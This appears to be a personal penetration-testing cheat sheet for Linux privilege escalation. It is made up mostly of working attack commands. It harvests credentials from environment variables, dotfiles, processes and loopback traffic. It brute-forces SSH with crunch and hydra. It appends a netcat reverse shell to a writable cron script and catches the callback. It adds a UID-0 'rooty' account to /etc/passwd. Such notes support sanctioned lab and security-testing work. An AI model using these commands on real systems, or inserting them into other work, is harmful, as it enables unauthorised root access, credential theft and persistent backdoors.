# Information Exposure

## User inspection

__Search for leaked credentials__

Environment
```bash
env
cat .bashrc # dotfiles (.bashrc/.zshrc, .bash_history/.zsh_history)
```

Pushing further on a leaked password
```bash
crunch 6 6 -t Lab%%% > wordlist

hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V
```

## Service Footprints

__Search for leaked credentials__

Inspect running services
```bash
watch -n 1 "ps -aux | grep pass"
```

Inspecting loopback traffic
```bash
sudo tcpdump -i lo -A | grep "pass"
```

## Cron jobs

__REQUIRES__
- Cronjob running a script
- Write permission over said script
- Said script running on reasonable interval

Check cron history and verify file permissions
```bash
grep "CRON" /var/log/syslog

ls -lah $file
```

Append rshell
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip 1234 >/tmp/f" >> $file
```

catch rshell
```bash
nc -lvnp 1234
```

## Abuse Password Authentication

__REQUIRES__
- Write permissions on /etc/passwd

Create password hash
```bash
openssl passwd my_pass
```

Add account to /etc/passwd
```bash
echo "rooty:$hash:0:0:root:/root:/bin/bash" >> /etc/passwd
```

Sign in as new user
```bash
su rooty
```